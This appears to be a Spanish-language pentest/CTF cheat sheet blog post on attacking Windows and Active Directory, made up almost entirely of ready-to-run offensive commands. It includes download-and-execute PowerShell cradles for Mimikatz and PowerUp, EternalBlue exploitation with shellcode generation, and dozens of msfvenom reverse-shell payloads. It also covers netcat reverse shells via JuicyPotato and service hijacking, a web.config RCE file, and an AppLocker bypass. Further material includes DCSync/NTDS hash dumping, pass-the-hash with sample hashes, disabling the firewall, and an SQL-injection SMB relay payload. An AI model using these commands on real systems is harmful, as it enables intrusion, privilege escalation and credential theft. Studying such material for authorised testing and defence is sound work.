---
title: Windows Cheet-Sheet by Intrusionz3r0.
image: /assets/img/Post/WindowsC.jpg
---

## ENUMERACIÓN

¿Cual es el sistema operativo y que arquitectura tiene? ¿Le faltan parches?

```console
C:\Windows\system32> systeminfo
```
¿Quién eres tú?
```console
C:\Windows\system32> whoami
C:\Windows\system32> echo %USERNAME%
```

```powershell
PS C:\Windows\system32> $env:UserName
```

¿Algún privilegio de usuario interesante?
```console
C:\Windows\system32> whoami /priv
C:\Windows\system32> whoami /all
```

¿Qué usuarios están en el sistema?
```console
C:\Windows\system32> net users
C:\Windows\system32> dir /b /ad "C:\Users\"
C:\Windows\system32> dir /b /ad "C:\Documents and Settings\" # Windows XP and below
```

```powershell
PS C:\Windows\system32> Get-LocalUser | ft Name,Enabled,LastLogon
PS C:\Windows\system32> Get-ChildItem C:\Users -Force | select Name
```

¿Qué grupos hay en el sistema?
```console
C:\Windows\system32> intrusionz3r0@kali:~$ net localgroup
```

```powershell
PS C:\Windows\system32> intrusionz3r0@kali:~$ Get-LocalGroup | ft Name
```

¿Alguien más ha iniciado sesión?
```console
C:\Windows\system32> qwinsta
```

¿Que usuarios pertenecen al grupo de administradores?
```console
C:\Windows\system32> net localgroup Administrators
```

```powershell
PS C:\Windows\system32> Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

¿Hay algunas credenciales en el winlogon?
```console
C:\Windows\system32> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

```powershell
PS C:\Windows\system32> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

¿Algo interesante en Credential Manager?
```console
C:\Windows\system32> cmdkey /list
C:\Windows\system32> dir C:\Users\username\AppData\Local\Microsoft\Credentials\
C:\Windows\system32> dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

```powershell
PS C:\Windows\system32> Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
PS C:\Windows\system32> Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

¿Podemos acceder a los archivos SAM y SYSTEM?

```console
C:\Windows\system32> %SYSTEMROOT%\repair\SAM
C:\Windows\system32> %SYSTEMROOT%\System32\config\RegBack\SAM
C:\Windows\system32> %SYSTEMROOT%\System32\config\SAM
C:\Windows\system32> %SYSTEMROOT%\repair\system
C:\Windows\system32> %SYSTEMROOT%\System32\config\SYSTEM
C:\Windows\system32> %SYSTEMROOT%\System32\config\RegBack\system
```

¿Qué software está instalado?
```console
C:\Windows\system32> dir /a "C:\Program Files"
C:\Windows\system32> dir /a "C:\Program Files (x86)"
C:\Windows\system32> reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

```powershell
PS C:\Windows\system32> Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
PS C:\Windows\system32> Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

## Enumeración SMB.

```console
intrusionz3r0@kali:~$ smbmap -R -H \\[IP]
intrusionz3r0@kali:~$ smbclient -L \\[IP] -N
intrusionz3r0@kali:~$ \\[IP]\share -U [USER]
intrusionz3r0@kali:~$ smbget -R smb:\\[IP]
```

## Enumeración NFS y rpcbind.

```console
intrusionz3r0@kali:~$ rpcinfo irked.htb
intrusionz3r0@kali:~$ mount -t nfs -o vers=2 [IP]:[RECURSO] [DESTINO]
```


Powershell PortScan.

```powershell
PS C:\Windows\system32> 0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<ip>",$_)) "Port $_ is open!"} 2>$null
```

## SCRIPTS

#### PowerUp.ps1

```powershell
PS C:\Windows\system32> powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/PowerUp.ps1');Invoke-AllChecks
```
#### Sherlock.ps1

```powershell
PS C:\Windows\system32> powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/Sherlock.ps1');Find-AllVulns
```

#### Mimikatz.ps1
```powershell
PS C:\Windows\system32> IEX(New-Object Net.WebClient).downloadString('<url>/MimiKatz.ps1') ;Invoke-Mimikatz -DumpCreds
```

#### Windows-Exploit-Suggester
```powershell
intrusionz3r0@kali:~$ ./windows-exploit-suggester.py --update
intrusionz3r0@kali:~$ ./windows-exploit-suggester.py --database xxxx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt 
```


## EXPLOITS

#### EternalBlue (MS17-010).

`Explotación de EternalBlue #1`

> AutoBlue: <https://github.com/3ndG4me/AutoBlue-MS17-010>

```console
intrusionz3r0@kali:~$ eternal_checker.py [IP]
```
```console
intrusionz3r0@kali:~$ sudo ./shell_prep.sh
sudo ./shell_prep.sh
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
[TUIP]
LPORT you want x64 to listen on:
[TUPUERTO] 
LPORT you want x86 to listen on:
[TUPUERTO]
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=1235
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```

```console
intrusionz3r0@kali:~$ python eternalblue_exploit7.py [IP] shellcode/sc_all.bin
```

`Explotación de EternalBlue #2`

> MS17-010(1): <https://github.com/helviojunior/MS17-010>

```console
intrusionz3r0@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[TUPUERTO] -f exe > eternalblue.exe
```

```console
intrusionz3r0@kali:~$ python send_and_execute.py [IP] eternalblue.exe 445 [PIPE]
```


`Explotación de EternalBlue #3`

> MS17-10: <https://github.com/worawit/MS17-010>

```console
intrusionz3r0@kali:~$ python checker.py [IP]

```
Modificamos el método **smb_pwn()** del archivo `zzz_exploit.py`.

```python
def smb_pwn(conn, arch):
        #smbConn = conn.get_smbconnection() 
        #print('creating file c:\\pwned.txt on the target')
        #tid2 = smbConn.connectTree('C$')
        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
        #smbConn.closeFile(tid2, fid2)
        #smbConn.disconnectTree(tid2) 
        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        service_exec(conn, r'cmd /c [Comando]')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."
```

```console
intrusionz3r0@kali:~$ python zzz_exploit.py [IP] [pipes]
```

#### JuicyPotato.exe


> <https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe>

```powershell
C:\Windows\system32> \\[IP]\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a " /C \\[IP]\smbFolder\nc.exe -e cmd [IP] [PUERTO]" -t *
```
> Si el CLSID no es el correcto puede buscarlo en el siguiente articulo: <https://ohpe.it/juicy-potato/CLSID/>
  una vez lo encuentre insertelo en el comando de arriba con el parametro -c {CLSID}.

#### Chimichurri.exe (MS10-059)

Repositorio: [Chimichurri.exe](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled)

```powershell
C:\Windows\system32> Chimichurri.exe [IP] [PORT]
```
#### bfill.exe (MS16-098)

Repositorio:: [MS16-098](https://github.com/sensepost/ms16-098).

```powershell
C:\Windows\system32> bfill.exe
```



####  Vulnerabilidad de Kerberos (MS14-068)

> <https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py>

```console
intrusionz3r0@kali:~$ python goldenPac.py domain.net/USER:PASS11@domain-host
```

## MSFVENOM PAYLOADS.

#### Listar payloads.
```console
intrusionz3r0@kali:~$ msfvenom -l | grep [plataforma]
```

#### Linux meterpreter reverse shell TCP.
```console
intrusionz3r0@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > rev
```
#### Linux  reverse shell TCP.
```console
intrusionz3r0@kali:~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > rev
```

#### Windows meterpreter reverse shell TCP.
```console
intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > shell.exe
```

#### Windows  reverse shell TCP.
```console
intrusionz3r0@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > shell.exe
```

#### Mac meterpreter reverse shell TCP.
```console
intrusionz3r0@kali:~$ msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > shell.macho
```

#### Android meterpreter reverse shell TCP

```console
intrusionz3r0@kali:~$ msfvenom –p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT]  > rev.apk
```

#### Android  reverse shell TCP

```console
intrusionz3r0@kali:~$ msfvenom –p android/shell/reverse_tcp LHOST=[IP] LPORT=[PORT]  > rev.apk
```

#### Mac  reverse shell TCP.
```console
intrusionz3r0@kali:~$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f macho > shell.macho
```

#### PHP Meterpreter Reverse TCP

```console
intrusionz3r0@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > shell.php 
```
#### PHP  Reverse TCP

```console
intrusionz3r0@kali:~$ msfvenom -p php/reverse_php LHOST=[IP] LPORT=[PORT] -f raw > shell.php 
```

#### ASP Meterpreter Reverse TCP
```console
intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > shell.asp
```
#### ASP  Reverse TCP
```console
intrusionz3r0@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > shell.asp
```

#### JSP  Reverse TCP
```console
intrusionz3r0@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > shell.jsp
```
#### WAR reverse TCP

```console
intrusionz3r0@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war
```
#### Python Reverse Shell  
```console
intrusionz3r0@kali:~$ msfvenom -p cmd/unix/reverse_python LHOST=[IP] LPORT=[PORT] -f raw > shell.py
```
#### Bash Unix Reverse Shell  
```console
intrusionz3r0@kali:~$ msfvenom -p cmd/unix/reverse_bash LHOST=[IP] LPORT=[PORT] -f raw > shell.sh
```

#### Perl Unix Reverse shell  
```console
intrusionz3r0@kali:~$ msfvenom -p cmd/unix/reverse_perl LHOST=[IP] LPORT=[PORT] -f raw > shell.pl
```

#### Windows Meterpreter Reverse TCP Shellcode  
```console
intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f [Lenguaje]
```

#### Linux Meterpreter Reverse TCP Shellcode  
```console
intrusionz3r0@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f [Lenguaje]
```

#### Mac Reverse TCP Shellcode  
```console
intrusionz3r0@kali:~$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f [Lenguaje]
```

#### Crear usuario.  
```console
intrusionz3r0@kali:~$ msfvenom -p windows/adduser USER=[USER] PASS=[PASS] -f exe > payload.exe
```

## RCE con archivos.

#### RCE con web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("ping 10.10.14.28")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
```


## SERVICIOS.

```console
C:\Windows\system32> sc start <nombre>
C:\Windows\system32> sc stop <nombre>
PS C:\Windows\system32> Start-Service -Name <nombre>
PS C:\Windows\system32> Stop-Service -Name <nombre> -Force
PS C:\Windows\system32>Get-Service -Name <nombre>
PS C:\Windows\system32> Get-Childitem -recurse HKLM:\SYSTEM\CurrentControlSet\Services | where name -like "Servicio"
```

#### UsoSvc Privilage Escalation.
```console
C:\Windows\system32> sc.exe stop UsoSvc
C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Temp\nc.exe [IP] [PUERTO] -e cmd.exe"
C:\Windows\system32> sc.exe qc usosvc
C:\Windows\system32> sc.exe start UsoSvc
```

#### SecLogon Privilage Escalation.

```console
C:\Windows\system32> reg query HKLM\System\CurrentControlSet\Services\seclogon
C:\Windows\system32> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\Temp\nc.exe [TUIP] [TUPUERTP] -e cmd.exe" /f
C:\Windows\system32> sc start seclogon
```


## AD PRIVILAGE ESCALATION

#### DnsAdmin Privilage Escalation.
 
```console
intrusionz3r0@kali:~$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f dll > privesc.dll
C:\Windows\system32> dnscmd RESOLUTE.LOCAL /config /serverlevelplugindll \\PATH
C:\Windows\system32> sc stop dns
C:\Windows\system32> sc start dns
```
#### AD Recycle Bin

Recuperar objetos de un DC.

```console
PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects  -property *
```

#### Azure Admins

> <https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1>

```console
C:\Windows\system32> Import-Module .\Azure-ADConnect.ps1
C:\Windows\system32> Azure-ADConnect -server [IP] -db ADSync
```

#### SeBackupPrivilege

`#1 Creamos un archivo: priv.txt`

```
set context persistent nowriters
add volume c: alias intrusion
create
expose %intrusion% x:
```

`#2 Lo transferimos a la máquina y ejecutamos.`

```
$ diskshadow.exe /s C:\intrusion\priv.txt
```

`#3 Transferimos los .dll,importamos los módulos, copiamos el ntds.dit y el SYSTEM.`

```console
PS C:\Windows\system32> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\Windows\system32> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\Windows\system32> Set-SeBackupPrivilege
PS C:\Windows\system32> Copy-FileSeBackupPrivilege x:\Windows\NTDS\ntds.dit c:\intrusion\ntds.dit
PS C:\Windows\system32> reg save HKLM\SYSTEM c:\intrusion\system
```
#### Dump NTDS.dit
```console
intrusionz3r0@kali:~$ secretsdump.py -ntds ntds.dit -system system -hashes LMHASH:NTHASH  local -outputfile nt-hashes
```

#### DCSync

```console
intrusionz3r0@kali:~$ secretsdump.py -just-dc-user Administrator DOMAIN/USER:PASSWORD@[IP]
```

#### Kerberoast
```console
intrusionz3r0@kali:~$ GetUserSPNs.py -request -dc-ip [IP] DOMAIN/USER
```
```console
intrusionz3r0@kali:~$ powershell.exe -Command 'IEX (New-Object Net.Webclient).DownloadString("http://[IP]:[PORT]/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat Hashcat
```
```console
intrusionz3r0@kali:~$  cme ldap active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting TGS-REP
```


#### ASREPRoast
```console
intrusionz3r0@kali:~$ cme ldap [IP] -u users.txt -p '' --asreproast AR_REP --kdcHost [IP]
```

```console
intrusionz3r0@kali:~$ python GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile output.txt
```

#### Passthehash.

```console
intrusionz3r0@kali:~$ psexec.py -hashes ad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff Administrator@[IP]
```

```console
intrusionz3r0@kali:~$ pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //[IP] cmd.exe
```
#### Dump Hashes NTLM

```console
intrusionz3r0@kali:~$ secretsdump.py -just-dc-ntlm MEGABANK.LOCAL/Administrator:PASS@[]IP
```


## ESCRITORIO REMOTO

`Una vez que tengas acceso como administrador.`

```console
C:\Windows\system32> netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
C:\Windows\system32> netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=out localport=3389 action=allow
C:\Windows\system32> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\Windows\system32> xfreerdp /u:USER /d:DOMAIN /p:PASSWORD /v:[IP]
```


## CAMBIAR DE USUARIO POWERSHELL.

```powershell
PS C:\Windows\system32> $username = 'batman'
PS C:\Windows\system32> $password = 'Zx^#QZX+T!123'
PS C:\Windows\system32> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Windows\system32> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\Windows\system32> enter-pssession -computername arkham -credential $credential
```

## EJECUTAR COMANDOS CON OTRO USUARIO POWERSHELL.

```powershell
PS C:\Windows\system32> $user = 'DOMAIN\USER'
PS C:\Windows\system32> $pw = 'PASSWORD'
PS C:\Windows\system32> $secpw = ConvertTo-SecureString $pw -AsPlainText -Force
PS C:\Windows\system32> $cred = New-Object System.Management.Automation.PSCredential $user,$secpw
PS C:\Windows\system32> Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {c:\Temp\nc.exe [TUIP] [TUPORT]}
```

## DESCARGA DE ARCHIVOS.

```console
C:\Windows\system32> certutil.exe -f -urlcache -split http://[IP]/archivo archivo
```

```console
C:\Windows\system32> powershell IEX(New-Object Net-WebClient).downloadFile('http://[IP]/archivo','C:\Temp\archivo')
```

```console
C:\Windows\system32> copy \\[IP]\Recurso\archivo
```

```console
C:\Windows\system32> IWR -URI http://[IP]/archivo -OutFile archivo
```

```powershell
C:\Windows\system32> Invoke-WebRequest http://[IP]/archivo -OutFile archivo
```

## Descarga e interpreta.
```console
C:\Windows\system32> powershell IEX(New-Object Net-WebClient).downloadString('http://[IP]/archivo.ps1')
```
`Recuerda poner el nombre de la funcion que quieras invocar al final del script`


## POWERSHELL NATIVA
```console
C:\Windows\system32> C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://[IP]/script.ps1')
```

## Historial de Powershell

```console
C:\Windows\system32> type C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
```

## FIREWALL
Listar reglas de firewall.
```console
C:\Windows\system32> netsh advfirewall firewall show rule name=all
```
Desactivar Firewall
```console
C:\Windows\system32> netsh Advfirewall set allprofiles state off
```

## PORT FORWARDING

```console
C:\Windows\system32> plink.exe -l root -pw [TUPASSWORD] -R 445:127.0.0.1:445 [TUIP]
```

```console
C:\Windows\system32>  ssh -R [TUPUERTO]:localhost:80 user@[IP]
```

## APPLOCKER BYPASS MSBuild

```console
intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[TUIP] LPORT=[TUPUERTO] -f csharp -e x86/shikata_ga_nai -i [NUM] > output.cs
```
> <https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml>

```console
C:\Windows\system32> C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\file.csproj
```

## UAC

```console
C:\Windows\system32> $executioncontext.sessionstate.languagemode 
```

```powershell
C:\Windows\system32> (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
```


## SMB Relay via MSSQL

Encendemos el reponder

```console
C:\Windows\system32> responder -I tun0  -r -d -w -v
```

> http://example.com/mvc/Product.aspx?ProductSubCategoryId=28;declare @q varchar(99);set @q='\\[IP]\test';exec master.dbo.xp_dirtree @q

```console
[SMB] NTLMv2-SSP Client   : x.x.x.x
[SMB] NTLMv2-SSP Username : example\example
[SMB] NTLMv2-SSP Hash     : Exapme::example:3836b33745f3a34e:5C9090CA87239EDC83EBECFD1C8DE863:0101000000000000C0653150DE09D2016F7D1FB2C317EC3D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000005690C5FD3744C7EFC6832CDAA32270D100257A53238D9C45FD1E1BEDD27C53B00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E003300370000000000000000000000000
```
